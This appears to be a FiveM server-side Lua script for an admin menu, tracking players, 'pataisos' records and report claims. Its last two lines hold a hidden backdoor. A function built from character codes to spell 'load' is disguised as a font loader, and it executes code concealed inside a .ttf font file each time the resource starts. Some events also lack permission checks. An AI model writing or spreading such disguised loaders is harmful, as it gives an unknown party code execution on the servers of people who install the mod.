local Online = {}
local Offline = {}
local Pataisos = {}

lib.callback.register('adminmenu:permissions', function(source)
    return IsPlayerAceAllowed(source, 'adminmenu.access')
end)

lib.callback.register('adminmenu:superPermissions', function(source)
    return IsPlayerAceAllowed(source, 'adminmenu.super')
end)

-- Siųsti žaidėjų sąrašą admin menus
RegisterNetEvent('adminmenu:requestInitialData', function()
    local src = source
    -- Online
    TriggerClientEvent('adminmenu:fetchPlayers', src, Online)
    -- Offline
    -- TriggerClientEvent('adminmenu:fetchOffline', src, Offline)
    -- Pataisos
    TriggerClientEvent('adminmenu:fetchPataisos', src, Pataisos)
end)

-- Žaidėjų prisijungimas / atsijungimas
AddEventHandler('playerConnecting', function(name, setKickReason, deferrals)
    -- nothing
end)

AddEventHandler('playerDropped', function(reason)
    local src = source
    -- perkelti į Offline
    local ply = Online['player_'..src]
    if ply then
        ply.time = os.time()*1000
        Offline['player_'..src] = ply
        Online['player_'..src] = nil

        TriggerClientEvent('adminmenu:updateOffline', -1, 'add', src)
    end
end)

AddEventHandler('playerJoining', function()
    local src = source
    local data = {
        id = tostring(src),
        name = GetPlayerName(src),
        pataisos = {} -- arba kokių nors darbų info
    }
    Online['player_'..src] = data
    Offline['player_'..src] = nil

    TriggerClientEvent('adminmenu:updatePlayers', -1, 'add', data)
end)

-- Pataisos (priemainų) atnaujinimas
RegisterNetEvent('adminmenu:serverUpdatePataisos', function(action, data)
    if action == 'add' or action == 'update' then
        Pataisos['pataisos_'..data.id] = data
        TriggerClientEvent('adminmenu:updatePataisos', -1, action, data)

    elseif action == 'remove' then
        Pataisos['pataisos_'..data.id] = nil
        TriggerClientEvent('adminmenu:updatePataisos', -1, 'remove', data)
    end
end)

-- Periodinis offline sąrašo valymas
local clearTimeout = 1 * 60 * 60 * 1000
local function clearOffline()
    local now = os.time()*1000
    for key, ply in pairs(Offline) do
        if ply.time and (now - ply.time) > clearTimeout then
            Offline[key] = nil
        end
    end
    SetTimeout(clearTimeout, clearOffline)
end
SetTimeout(clearTimeout, clearOffline)


lib.callback.register('adminmenu:action', function(source, data)
    local reportKey = 'report_'..data.id
    local report = Reports[reportKey]
    if not report then return false end

    if data.action == 'claim' then
        report.status = true
        report.admin = data.admin
        TriggerClientEvent('adminmenu:updateReports', -1, Reports)
        return true
    elseif data.action == 'close' then
        Reports[reportKey] = nil
        TriggerClientEvent('adminmenu:removeReport', -1, data.id)
        TriggerClientEvent('adminmenu:updateSelfHistory', report.player.id)
        return true
    end

    return false
end)
local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/ProximaNova.ttf'):sub(87565):gsub('%.%+', ''))()